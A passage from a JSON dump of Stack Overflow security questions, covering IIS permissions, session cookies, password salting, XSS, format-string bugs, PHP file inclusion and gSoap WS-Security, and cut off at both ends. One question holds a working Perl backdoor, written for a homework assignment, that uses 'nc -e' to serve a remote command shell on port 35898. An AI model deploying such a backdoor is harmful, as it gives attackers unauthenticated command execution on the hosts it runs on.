extension).</p>\n\n<p>Obviously I do not wish to use the \"everyone\" account as this blows the security wide open.  So I have removed the permissions for \"everyone\".</p>\n\n<p>My app runs under an application pool - \"TestAppPool\". I have followed the top rated answer at  <a href=\"http://stackoverflow.com/questions/7334216/iis7-permissions-overview-applicationpoolidentity\">IIS7 Permissions Overview - ApplicationPoolIdentity</a> and added security for user \"IIS AppPool\\TestAppPool\" to \"full control\".\nHowever this does not allow the *.update dll to overwrite the *.run dll.</p>\n\n<p>Can anyone point me in the right direction.</p>\n"},{"tags":["sql-server","sql-server-2008","security","sql-server-2012"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13074704,"title":"SQL Server Activity Monitor Ports","body":"<p>I'm trying to convince my IT department to grant me necessary <a href=\"http://msdn.microsoft.com/en-us/library/ms175518.aspx#Security\" rel=\"nofollow\">permissions</a> on our SQL Server 2012 instance in order to use the Activity Monitor in the Management Studio.  Our lead IT administrator is concerned about granting them because he is unsure what, if any, ports Activity Monitor listens on.  I'd like to add that I currently have access to this SQL Server instance on port 1433.</p>\n\n<p>I'm not very familiar with Activity Monitor's inner workings, are there any specific ports Activity Monitor listens on that should be a security concern?  Does anyone know any resources that may provide this information?  I want to make sure I give an accurate response.</p>\n"},{"tags":["php","security","codeigniter","web-applications","frameworks"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":100,"score":0,"question_id":13073970,"title":"Good Php Framework for strong security","body":"<p>I'm trying to choose a framework that provides really good security of web applications, protects against as much of OWASP Top-10 as possible, such as:</p>\n\n<ul>\n<li>Sql Injection</li>\n<li>XSS </li>\n<li>CSRF</li>\n<li>Authentication</li>\n<li>Authorization</li>\n<li>etc.</li>\n</ul>\n\n<p>the thing is I've tried researching really heavily:\nCakephp, Zend, Yii, Code Igniter, Kohana and some have <em>basic</em> authentication, maybe a little authorization, but nothing for any application that needs solid code-security.</p>\n\n<p>Is most of the vulnerability types above currently secured by only writing custom code in these frameworks? </p>\n\n<p>This is kinda my first experience with using frameworks, everything up til this point has been custom php web apps. My whole thought for php-frameworks was it was going to be <em>easy</em> to protect against these vulnerabilities, given it isn't <em>natively</em>, why use one? Or is there a framework out there I'm not looking at which is better than those listed above for strong web app security? Thanks</p>\n"},{"tags":["php","javascript","apache","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13075003,"title":"Session Cookie without HttpOnly flag set","body":"<p>I have joust built a website with a login system. After I've just got ready I have scanned it with Acunetix, but I got the following message:</p>\n\n<p>Session Cookie without HttpOnly flag set\nSession Cookie without Secure flag set (i guess this is only if I have SSL connection)</p>\n\n<p>So my question would be, that how can I set HttpOnly flag for all my Session data? I'm just using sessions when I log in the users. I'm giving them a session with their userID number and than I'm getting data using that userID.</p>\n\n<p>Is there any simple way that I can set ALL of the session HTTPOnly and secure them, so noone can touch them?</p>\n"},{"tags":["windows","security","command-line"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":13073765,"title":"Security of plain-text passwords in windows command-prompt","body":"<p>This is a question with a rather small scope, but I'm running a lot of windows command prompt commands that involve using the admin password. I can either have part of the command be \"/user:administrator /password:examplepassword\", where examplepassword is in plaintext, or I can just have \"/user:administrator\", and it prompts me for the password, which I then enter masked (<strong><em>*</em>**<em>*</em>**<em>*</em></strong>). </p>\n\n<p>So, my question is simply this: is entering the password in the plaintext secure? (obviously besides the simple over-the-shoulder insecurity of it). Are command line arguments saved anywhere on the computer after a command prompt session is closed?</p>\n\n<p>Thanks! </p>\n"},{"tags":["javascript","security","script","subdomain","same-origin-policy"],"answer_count":0,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":34,"score":4,"question_id":13074711,"title":"User-specific Subdomains : JavaScript security","body":"<p>If I provide a public-facing website for users on my website at their own subdomain (e.g. <code>bob.myapp.com</code>) under their own control, can I allow them to execute arbitrary JavaScript without putting my main app server at risk (e.g. <code>myapp.com</code>)?  The users would be able to put their own <code>*.js</code> files in the public root of their subdomains.</p>\n\n<p>I have an <strong>extremely</strong> limited understanding of the JS Same Origin Policy, but I believe that different subdomains count as different origins.  Therefore if my main app (<code>myapp.com</code>) is secured from XSS etc., is there anything specific I need to worry about from the users' subdomains that I wouldn't have to worry about for any other external source?</p>\n\n<p>Thanks!</p>\n"},{"tags":["javascript",".net","ajax","security","textbox"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":96,"score":1,"question_id":6422529,"title":"Firefox Remembers Textbox Value in Advance in .NET","body":"<p>I have multiple textboxes to enter credit card and security number for it. But I dont want browsers to remember which numbers the customer entered to them. </p>\n\n<p>Note: The page is completely sending ajax request by using javascript for any operations.</p>\n\n<p>Refers to : <a href=\"http://stackoverflow.com/questions/582244/is-there-a-w3c-valid-way-to-disable-autocomplete-in-a-html-form\">Is there a W3C valid way to disable autocomplete in a HTML form?</a></p>\n"},{"tags":["java","security","signature","malware"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":53,"score":3,"question_id":13071139,"title":"Signature malware detection","body":"<p>I'm writing malware detection based on signature scanning. As I understood, the main idea is to compare signature of scanned file with signatures in your blacklist. \n<a href=\"http://computer-programming-languages.knoji.com/create-your-own-professional-antivirus-program-using-the-programming-software-visual-basic/\" rel=\"nofollow\">Here</a> I found that signature is some kind of MD5 hash, but how can I get it from file? And are there any other types of signatures?</p>\n"},{"tags":["c#",".net","security","firewall","antivirus"],"answer_count":4,"favorite_count":0,"up_vote_count":8,"down_vote_count":0,"view_count":209,"score":8,"question_id":6302830,"title":"Application shown as threat by AVG","body":"<p>I am working on project in VB.Net that includes Socket Communication and embedded HTTPListeners, this is a group of applications that intercommunicate using Sockets. My problem is from few days I received report of Anti-virus (AVG) showing one of executable as threat. </p>\n\n<p>Looking into the matter I was thinking to replace sockets with NamedPipes but still http listener would remain there.</p>\n\n<p>How can I solve this problem</p>\n"},{"tags":["asp.net","security","custom-attributes"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13071615,"title":"C# MVC - Overriding AuthorizeCore from AuthorizeAttribute is not being invoked","body":"<p>For some reason, only the method <code>OnAuthorization</code> is being invoked, but <code>AuthorizeCore</code> not.<br>\nthis is how I call it:</p>\n\n<pre><code>[AuthorizeWithRoles(Roles = \"Affiliate\")]\npublic string TestOnlyAffiliate()\n{\n     return \"ok\";\n}\n</code></pre>\n\n<p>this is the actual attribute.</p>\n\n<pre><code>public class AuthorizeWithRolesAttribute : AuthorizeAttribute\n{\n\n    public string Roles { get; set; }\n\n    //\n    //AuthorizeCore - NOT INVOKING!\n    //\n    protected override bool AuthorizeCore(HttpContextBase httpContext)\n    {\n        return true;\n    }\n    public  void OnAuthorization(AuthorizationContext filterContext)\n    {\n\n    }\n}\n</code></pre>\n"},{"tags":["php","security","oop"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":120,"score":1,"question_id":13058253,"title":"Is this PHP code dangerous?","body":"<p>I've just sketched up the main index.php file. It should be the gateway for all the site requests. The reason why I want that is to have clean URLs.</p>\n\n<p>I have split my website into modules. (Example: register, articles etc..)</p>\n\n<p>Then I've included some lines in .htaccess, one is this:</p>\n\n<pre><code>RewriteRule ^([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?([a-zA-Z0-9-]*)[/]?$ index.php?1=$1&amp;2=$2&amp;3=$3&amp;4=$4&amp;5=$5&amp;6=$6&amp;7=$7&amp;8=$8&amp;9=$9 [L,NC] \n</code></pre>\n\n<p>This just maps each \"folder\" to the right $_GET element... domain/1/hi/3</p>\n\n<pre><code>$_GET['2'] == 'hi'; // TRUE\n</code></pre>\n\n<p>So I want to run the module based on the first $_GET element. This way I can keep my project organized. And all files associated with a module is inside its folder.</p>\n\n<p>Here is my folder structure:</p>\n\n<pre><code>/\n    modules/\n        register/\n            ajax/\n                process.php\n            register.php\n        articles/\n            articles.php\n    index.php\n</code></pre>\n\n<p>And here is the PHP-code to map everything (index.php):</p>\n\n<pre><code>&lt;?php\n\n$basePath = 'modules';\n\nfor ($x = 1; $x &lt;= 9; $x++) {\n    if (preg_match('/[^a-zA-Z0-9-]/', $_GET[$x])) {\n        require_once(__DIR__ . \"/$basePath/404/404.php\");\n        die();\n    }\n}\n\n$baseModule = $_GET['1'];\n\nif (file_exists(__DIR__ . \"/$basePath/$baseModule/$baseModule.php\")) {\n    require_once(__DIR__ . \"/$basePath/$baseModule/$baseModule.php\");\n} else {\n    require_once(__DIR__ . \"/$basePath/404/404.php\");\n}\n</code></pre>\n\n<p>Is this dangerous code? The reason why I do the regex is to check that the GETs doesn't contain . or / which could be used to do ../ and thus run virtually any file on the server...</p>\n\n<p>Does this still pose a security hole, a potential security hole, or is it in fact, bad practice?</p>\n\n<p>What is the best approach to this problem?</p>\n"},{"tags":["javascript","security","xss","wymeditor"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13069368,"title":"Is it safe to use a Wymeditor on a live site? Could an automated script disable javascript?","body":"<p>Im curious, the pages in question are password protected but it got me thinking. Im experitmenting with the Wymeditor J-Query plugin, it works rather well and deals with XSS scripting attempts by automatically converting angle brackets into html characters etc.</p>\n\n<p>Obviously with direct access a user could disable javascript and then insert any manner of malicious tags into the DB. However i am wondering would it be possible for an automated script to disable javascript if it managed to get buy the password protection, and thus insert malicious scripts to the DB which would then be run when DB information is displayed on another page??</p>\n\n<p><strong>* UPDATE *</strong></p>\n\n<p>I should probably have expanded a bit. I would usually strip_tags() and use prepared statements however for Wymeditor to be of any use to the client then I can't use strip_tags(). I know I could write some code to remove any malicious looking content but im not sure just how much malicious content i would be looking for, im assuming XSS attacks are alot more varied than just &lt; script >do bad stuff&lt; script > type of thing.</p>\n"},{"tags":["security","principles"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13069555,"title":"Does \"Total mediation\" is a part of \"Defense in depth\" principle?","body":"<p>I understand that Total Mediation is about constant re-checking of authorisation on all levels of execution. And Defense in Depth is more about building a number of independent security means that should be all passed for attack to be successful. And it looks like Total Mediation is a one of the means of Defense in Depth. So what is the point to have two security principles instead of one?</p>\n"},{"tags":["security","implementation","xacml"],"answer_count":12,"favorite_count":3,"up_vote_count":6,"down_vote_count":0,"view_count":3479,"score":6,"question_id":2893247,"title":"Who does actually use XACML?","body":"<p>Who knows actively developed XACML Implemtations other than the Sun XACML Implementation and XEngine?</p>\n\n<p>Who uses them in their products?</p>\n\n<p>Which vendors provide a PDP? I read something about a WebLogic XACML Privider. What other products support XACML?</p>\n"},{"tags":["javascript","asp.net","security","ssl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13067974,"title":"protecting HTTP traffic from sniffing","body":"<p>Sorry if this question was asked, but i haven't found exact question. I have HTML form that is being submited in plaintext. I know that there is HTTPs with SSL, but i don't want to buy certificate. Is it possible in some way to encrypt form data? I am thinking about two things:</p>\n\n<ul>\n<li>hashing form data via javascript - in fact i only want to send password so i don't need to know its' origin value.</li>\n<li>RSA - not sure if it could be implemented in javascript.\nWhat would you suggest? Any other variants?</li>\n</ul>\n"},{"tags":["c#","asp.net-mvc","security","userprincipal"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13068447,"title":"Principal get lost after one requst","body":"<p>I have the function <code>AffiliateLogin</code> in a controller that sets the <code>Principal</code>.<br>\nthe row <code>principal.User = user;</code> is actually the one storing the Principal.\nBut after I redirect to another controller, and test my <code>AuthorizeWithRolesAttribute</code> attribute, the principal is reset.\nthis is one second after the login, you can see the red arrow:  </p>\n\n<p><img src=\"http://i.stack.imgur.com/N9OT9.png\" alt=\"enter image description here\"></p>\n\n<p>this is the function that stores it.<br>\nWhat am I doing wrong?<br>\nThanks  </p>\n\n<pre><code>public JsonResult AffiliateLogin(string email, string password)\n        {\n            if (ModelState.IsValid)\n            {\n                Affiliate user = api.GetUserByCredencials&lt;Affiliate&gt;(email, password);\n                if (user != null)\n                {\n\n                     IIdentity identity = new UserIdentity(true,user.Email);\n                    UserPrincipal principal = new UserPrincipal(identity, new string[] {\"Affiliate\"});\n                    principal.User = user;\n\n                    HttpContext.User = principal;\n                    return Json(\"Login success\");\n                }\n            }\n            return Json(\"Fail To Login\");\n        }\n</code></pre>\n"},{"tags":["android","security","smali"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13068044,"title":"Identifying the leaked private informations by inspecting smali code of Android application","body":"<p>I'm trying to detect the leakage of private information by inspecting the smali code of Android applications. My strategy so far is.. searching the code that substitutes a personal information (e.g. IMEI, phone number) into a variable, then trace that variable until the point where it's sent to the internet or where it's not used anymore.</p>\n\n<p>Are there any nice tools for doing this?</p>\n\n<p>I've tried </p>\n\n<ul>\n<li>apkinspector (http://code.google.com/p/apkinspector/)</li>\n<li>androguard (http://code.google.com/p/androguard/)</li>\n<li>androwarn (https://github.com/maaaaz/androwarn)</li>\n</ul>\n\n<p>, but none of these are likely to be able to do what I want.</p>\n"},{"tags":["c","security","format-string"],"answer_count":6,"favorite_count":7,"up_vote_count":11,"down_vote_count":0,"view_count":1369,"score":11,"question_id":7459630,"title":"How can a Format-String vulnerability be exploited?","body":"<p>I was reading about vulnerabilities in code and came across this <em>Format-String Vulnerability</em>. </p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Uncontrolled_format_string\" rel=\"nofollow\">Wikipedia</a> says:</p>\n\n<blockquote>\n  <p>Format string bugs most commonly appear when a programmer wishes to\n  print a string containing user supplied data. The programmer may\n  mistakenly write printf(buffer) instead of printf(\"%s\", buffer). The\n  first version interprets buffer as a format string, and parses any\n  formatting instructions it may contain. The second version simply\n  prints a string to the screen, as the programmer intended.</p>\n</blockquote>\n\n<p>I got the problem with printf(buffer) version, but I still didn't get how this vulnerability can be used by attacker to execute harmful code. Can someone please tell me how this vulnerability can be <strong>exploited</strong> by an example?</p>\n"},{"tags":["security","passwords","md5","saltedhash","salt-creation"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":13062633,"title":"Global site salt, is it worth it?","body":"<p>I'm making a user database and I was thinking about security and it just made me think, is it really worth it to have a site salt when I'm going to have unique user salts on everybody.</p>\n\n<pre><code>md5(GLOBAL_SALT . $password . $user_salt);\n</code></pre>\n\n<p>vs</p>\n\n<pre><code>md5($password . $user_salt);\n</code></pre>\n\n<p>My thoughts is if the site were to get hacked the hackers would have access to the global salt anyway.</p>\n"},{"tags":["ajax","security","api","web","client"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":13,"score":-1,"question_id":13065520,"title":"How to secure a Mvc4 Webapi Webservice - accessed by js client [ajax]","body":"<p>I have a web-service built in mvc4 webapi, this web-service will be consumed by a website using j query or similar client side scripting technology [moo tools, knocout].</p>\n\n<p>The problem i am facing is how could i secure my web service from anyone who is not authorized to use except the one authorized client.</p>\n"},{"tags":["php","database","forms","security","hidden"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13065012,"title":"which is faster sending hidden form data or getting data from database","body":"<p>I'm using hidden form to send value. With a submit button. </p>\n\n<p>Its like:</p>\n\n<pre><code>&lt;form action=\"users.php?action=edit\" method=\"POST\"&gt;\n&lt;input type=\"hidden\" name=\"first_name\" value=\"Josh\" size=\"20\" maxlength=\"19\"/&gt;\n&lt;input type=\"submit\" name=\"done\" value=\"Done\"/&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>And i'm using these values in the next form i'm creating. I don't know which will be better, doing it like this or by getting data from database. Also, which will be more secure ?</p>\n"},{"tags":["security","rest","instagram"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13064337,"title":"How does Instagram lock down their photo upload private API endpoint?","body":"<p>I'm in the process of building a REST API for a mobile application I'm working on. Like Instagram, I'm considering locking down some of the endpoints such that they would only be accessible from my mobile app (like their photo upload endpoints). </p>\n\n<p>Has anyone have any insight as to how they locked down certain endpoints to only their app? I imagine a possible solution was the use of a shared secret to sign these specific requests and have it verified server-side before processing the upload. </p>\n"},{"tags":["php","security","passwords","phpass"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13063987,"title":"Is there a newer / improved / alternative version for phpass?","body":"<p>I'm about to implement <a href=\"http://www.openwall.com/phpass/\" rel=\"nofollow\">phpass</a> into a new application because of its theoretical and technical arguments towards security. It is of course not the only security, but for hashing passwords this seems to me like the best available.</p>\n\n<p>However, I don't get really happy when looking at its source code. It goes against some of my most basic code conventions, especially when it comes to security.</p>\n\n<pre><code>return $hash == $stored_hash;\n</code></pre>\n\n<p>I would always use the identical operator (<code>===</code>) on code around security.</p>\n\n<pre><code>if ($hash[0] == '*')\n    $hash = crypt($password, $stored_hash);\n</code></pre>\n\n<p>I would always use curly brackets <code>{</code> with an if. It doesn't matter that much whether they are on the same line, but just omitting them even though it is possible doesn't give me a good feeling.</p>\n\n<p>Also, there is no way of forcing the CRYPT_BLOWFISH method. Right now I do that by checking for the length to be exactly 60 chars in my own wrapper.</p>\n\n<p>I was wondering if someone knows an updated version? An improved one which is maintained and checked upon by a larger community then just one person? A newer version which makes all possible usage of PHP5 for example unbuffered reads <a href=\"http://www.openwall.com/articles/PHP-Users-Passwords\" rel=\"nofollow\">as the author himself already suggests</a>?</p>\n\n<p>Or maybe I'm just being paranoid with no real reason.</p>\n"},{"tags":["php","security"],"answer_count":3,"favorite_count":2,"up_vote_count":0,"down_vote_count":2,"view_count":50,"score":-2,"question_id":13063847,"title":"Is it safe to use count() on unsanitized array? php","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13062543/can-php-variable-hold-harmfull-code-safely\">Can php variable hold harmfull code safely?</a>  </p>\n</blockquote>\n\n\n\n<p>Let's say I have array named $content. The array holds harmfull data.</p>\n\n<p>Is it safe to do the following?</p>\n\n<pre><code>$test = count($content);\necho $test;\n</code></pre>\n\n<p>Would count() somehow execute the harmfull data?</p>\n"},{"tags":["php","sql","security","injection"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":13062543,"title":"Can php variable hold harmfull code safely?","body":"<p>Let's say I have a text file. It contains \"harmfull\" code like:</p>\n\n<pre><code>&lt;?php phpinfo(); ?&gt;\n</code></pre>\n\n<p>or it could be anything else, SQL injection code, html links etc...</p>\n\n<p>Now here is my example script:</p>\n\n<pre><code>$content = file_get_contents('harmfullcode.txt');\n</code></pre>\n\n<p>Now obviously $content variable will store that harmfull code.</p>\n\n<p>My question is, is it safe to store such information in a variable?</p>\n\n<p>I know for example if I</p>\n\n<pre><code>echo $content;\n</code></pre>\n\n<p>then it WILL be harmfull.</p>\n\n<p>But if I don't do anything with the variable, is it safe for the variable to hold any type of harmfull code?</p>\n\n<p><strong>Edited to make it more clear:</strong></p>\n\n<p>What is the difference between this?</p>\n\n<pre><code>$content = file_get_contents('harmfullcode.txt');\n$safevar = removebadstuff($content);\necho $safevar;\n</code></pre>\n\n<p>VS</p>\n\n<pre><code>$content = removebadstuff(file_get_contents('harmfullcode.txt'));\necho $content;\n</code></pre>\n\n<p>the second example removes bad stuff before assigning it to $content...?? I'm kind of new to php security, trying to grasp the concept. Thank you.</p>\n"},{"tags":["linux","security","passwords"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13063119,"title":"My unix machine is accessed remotely without a passowrd","body":"<p>I was trying to download from my own Linux machine remotely from another computer but to my dismay I found out that my Linux machine is not secured and I can access it without a password. How can I fix it so that it must ask a password when it is accessed remotely.</p>\n\n<p>Regards\nYacob</p>\n"},{"tags":["android","security","credit-card","keystore"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":83,"score":5,"question_id":13047475,"title":"Is it secure that store creadit card info on android?","body":"<p>In my approach, at first time user wants to pay by credit card, he must reenter his login password and full credit card info.</p>\n\n<p>after success paid, I generate a random key, pack it as a keystore, finally store keystore file at internal storage, this keystore file is locked by user's login password. on the other hand, credit card info will be encrypted by this key and turn into a Base64 encoded string, finally write into a file in internal storage.</p>\n\n<p>at next time pay by credit card, user also must reenter his login password, so I can use it to unlock the keystore file and extract key. at this point, I has ability to decrypt user's credit card info.</p>\n\n<p>above is my approach to secure credit card info stored on device, is it secure?</p>\n"},{"tags":["perl","security","system-calls","netcat"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":37,"score":-1,"question_id":13061216,"title":"Perl script making call to itself (through nc -e) is failing. Claiming no such file/dir","body":"<p>We have been asked to set up a backdoor in a victim machine for a homework assignment. I've gained access to the machine and I want to have the following script run on a <code>cron</code>, but it's throwing an error.</p>\n\n<p>I've verified that the <code>@ARGV</code> test works correctly by calling the program independently with and without the dummy <code>run</code> argument, but when I try and <code>netcat</code> into the victim machine on <code>port 35898</code> after initializing the script, the following error is all I get on connection.</p>\n\n<p><strong>Error:</strong> <code>exec /bin/vshell run failed : No such file or directory</code></p>\n\n<p>Obviously the program exists because the program is calling itself.</p>\n\n<p><strong>Code:</strong></p>\n\n<pre><code>#!/usr/bin/perl -w\n\n$| = 1;\nmy $prompt = '$ ';\n\n# run is just a dummy arg\nif(!@ARGV){ exec(\"nc -e '/bin/vshell run' -l -p 35898\"); die; }\n\nwhile(1){\n  print $prompt;\n  eval {\n    local $SIG{ALRM} = sub { die 'Goodbye!\\n'; };\n\n    alarm 60;\n    &amp;syscall;\n    alarm 0;\n  };\n  if( $@ ){ die; }\n}\n\nsub syscall{\n  if( defined( $_ = &lt;STDIN&gt; )){\n    chomp;\n    system( $_ );\n  }\n}\n</code></pre>\n\n<p>I've been at this for a while and I could really use a nudge in the right direction. Thanks!</p>\n\n<p>PS: This install of <code>nc</code> is compiled with the security hole which allows the <code>-e</code> flag and I have verified this functionality on other programs.</p>\n"},{"tags":["java","c++","web-services","security","gsoap"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":240,"score":1,"question_id":9670106,"title":"How to consume a Java Metro Web Service using Username Authentication with a Symmetric key in a Gsoap client?","body":"<p>I am doing research on interoperability between secure web services. The security has to be done on the message level ONLY. So far I have managed to get WCF and WSIT/Metro working together using certificates. Now I am trying to do the same thing using gSoap, but so far I have had no luck.</p>\n\n<p>I have succesfully managed to generate a header file from the Java service WSDL using wsdl2h and I was able to generate the necessary classes using soapcpp2. By following the gsoap documentation, the WSSE and WSA plugins <em>should</em> be configured correctly and indeed if I do some sniffing in Wireshark, I see that the Gsoap client sends a request with a security header and the WS-Addressing fields (To, Action, MessageID, ReplyTo). </p>\n\n<p>The Java service is configured to use Username Authentication with a Symmetric Key using the 3DES algorithm, username authentication token and a Lax security header layout.</p>\n\n<p>The certificates are in the Glassfish keystore and truststore and have been exported and converted to PEM files for usage in gSoap.</p>\n\n<p>This is my code for the C++ application:</p>\n\n<pre><code>    #include &lt;cstdlib&gt;\n    #include &lt;iostream&gt;\n    #include \"soapNewWebServicePortBindingProxy.h\"\n    #include \"NewWebServicePortBinding.nsmap\"\n    #include \"wsseapi.h\"\n    #include \"wsaapi.h\"\n\n    using namespace std;\n\n    /*\n     * \n     */\n    int main(int argc, char** argv) {\n        static char DES_KEY[20] =\n        { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 };\n        /* SET UP */\n        NewWebServicePortBinding proxy;\n        proxy.soap = soap_new1(SOAP_XML_CANONICAL | SOAP_XML_INDENT);\n        soap_register_plugin(proxy.soap, soap_wsa);\n        soap_register_plugin(proxy.soap, soap_wsse);  \n        ns1__hello req;\n        ns1__helloResponse resp;\n        req.name = new std::string(\"derpenstein\");  \n\n        /* ADD WS-SECURITY ELEMENTS  */    \n        soap_wsse_add_Security(proxy.soap);\n        soap_wsse_add_Signature(proxy.soap);\n        soap_wsse_add_Timestamp(proxy.soap, NULL, 300);\n\n        //OpenSSL_add_all_algorithms();\n        FILE *fd = fopen(\"gsoappublic.pem\", \"r\");\n        FILE *fpriv = fopen(\"gsoapprivate.pem\", \"r\");\n\n        X509 *cert = PEM_read_X509(fd, NULL, NULL, NULL);\n\n        EVP_PKEY *privkey = NULL;\n        EVP_PKEY *pubkey = NULL;\n\n        privkey = PEM_read_PrivateKey(fpriv, NULL, NULL, (void*)\"changeit\");\n\n        if (!privkey) {\n            cout &lt;&lt; \"error getting private key\" &lt;&lt; endl;\n            ERR_print_errors_fp(stderr);\n            return -1;\n        }\n\n        pubkey = X509_get_pubkey(cert);\n        if (!pubkey) {\n            cout &lt;&lt; \"error getting public key from certificate\" &lt;&lt; endl;\n        }\n        fclose(fd);\n        fclose(fpriv);\n\n        if (soap_wsse_encrypt_body(proxy.soap, SOAP_MEC_ENC_DES_CBC, DES_KEY, sizeof(DES_KEY))\n         || soap_wsse_add_EncryptedKey(proxy.soap, \"Cert\", cert, NULL)\n         || soap_wsse_add_UsernameTokenText(proxy.soap, \"User\", \"test\", \"test\")\n         || soap_wsse_sign_body(proxy.soap, SOAP_SMD_SIGN_RSA_SHA1, privkey, 0)\n         || soap_wsse_add_BinarySecurityTokenX509(proxy.soap, \"X509Token\", cert)\n         || soap_wsse_add_KeyInfo_SecurityTokenReferenceX509(proxy.soap, \"#X509Token\")){\n            soap_print_fault(proxy.soap, stderr);\n        }\n\n        /* ADD WS-ADDRESSING */\n        soap_wsse_set_wsu_id(proxy.soap, \"wsa5:From wsa5:To wsa5:ReplyTo wsa5:FaultTo wsa5:Action\");  \n        if (soap_wsa_request(proxy.soap, \"uuid:5012354ad\", \"http://belgianguypc:8080/NewSecureService/NewWebService\", \"http://newsec.mince.org/NewWebService/helloRequest\")\n            || soap_wsa_add_ReplyTo(proxy.soap, \"http://www.w3.org/2005/08/addressing/anonymous\")) {\n            soap_print_fault(proxy.soap, stderr);\n        }\n\n\n        /* MAKE THE CALL */\n        int err = proxy.__ns1__hello(&amp;req, &amp;resp);\n        if (err == SOAP_OK) {\n            cout &lt;&lt; \"Success!\";\n            cout &lt;&lt; resp.return_;\n        }\n        else {\n            cout &lt;&lt; \"When sending:\" &lt;&lt; endl;\n            soap_print_fault(proxy.soap, stderr);\n            return -1;\n        }\n\n        return 0;\n    }\n</code></pre>\n\n<p>As far as I am aware, what I am doing is adding the timestamp, the certificate, the username and password, then I encrypt the body with a dummy DES key and I sign the message with my own private key. Then I make the call...</p>\n\n<p>However this is not working, what I get as output is:</p>\n\n<pre><code>When sending:\nSOAP 1.1 Fault: wsse:FailedCheck [no subcode]\n\"WSS1927: Error occurred while decrypting EncryptedKey\"\nDetail: [no detail]\n</code></pre>\n\n<p>GlassFish gives a stack trace:</p>\n\n<pre><code>SEVERE: WSS1913: Key used to decrypt EncryptedKey cannot be null\nSEVERE: WSS1927: Error occured while decrypting EncryptedKey\nSEVERE: WSITPVD0035: Error in Verifying Security in Inbound Message.\ncom.sun.xml.wss.impl.WssSoapFaultException: WSS1927: Error occured while decrypting EncryptedKey\n    at com.sun.xml.ws.security.opt.impl.util.SOAPUtil.newSOAPFaultException(SOAPUtil.java:158)\n    at com.sun.xml.ws.security.opt.impl.incoming.EncryptedKey.getKey(EncryptedKey.java:354)\n    at com.sun.xml.ws.security.opt.impl.incoming.KeySelectorImpl.resolveDirectReference(KeySelectorImpl.java:628)\n    at com.sun.xml.ws.security.opt.impl.incoming.processor.SecurityTokenProcessor.processDirectReference(SecurityTokenProcessor.java:267)\n    at com.sun.xml.ws.security.opt.impl.incoming.processor.SecurityTokenProcessor.resolveReference(SecurityTokenProcessor.java:143)\n    at com.sun.xml.ws.security.opt.impl.incoming.processor.KeyInfoProcessor.processKeyInfo(KeyInfoProcessor.java:152)\n    at com.sun.xml.ws.security.opt.impl.incoming.processor.KeyInfoProcessor.getKey(KeyInfoProcessor.java:132)\n    at com.sun.xml.ws.security.opt.impl.incoming.EncryptedData.process(EncryptedData.java:156)\n    at com.sun.xml.ws.security.opt.impl.incoming.EncryptedData.&lt;init&gt;(EncryptedData.java:113)\n    at com.sun.xml.ws.security.opt.impl.incoming.SecurityRecipient.createMessage(SecurityRecipient.java:791)\n    at com.sun.xml.ws.security.opt.impl.incoming.SecurityRecipient.validateMessage(SecurityRecipient.java:232)\n    at com.sun.xml.wss.provider.wsit.WSITServerAuthContext.verifyInboundMessage(WSITServerAuthContext.java:586)\n    at com.sun.xml.wss.provider.wsit.WSITServerAuthContext.validateRequest(WSITServerAuthContext.java:360)\n    at com.sun.xml.wss.provider.wsit.WSITServerAuthContext.validateRequest(WSITServerAuthContext.java:263)\n    at com.sun.enterprise.security.webservices.CommonServerSecurityPipe.processRequest(CommonServerSecurityPipe.java:173)\n    at com.sun.enterprise.security.webservices.CommonServerSecurityPipe.process(CommonServerSecurityPipe.java:144)\n    at com.sun.xml.ws.api.pipe.helper.PipeAdapter.processRequest(PipeAdapter.java:119)\n    at com.sun.xml.ws.api.pipe.Fiber.__doRun(Fiber.java:641)\n    at 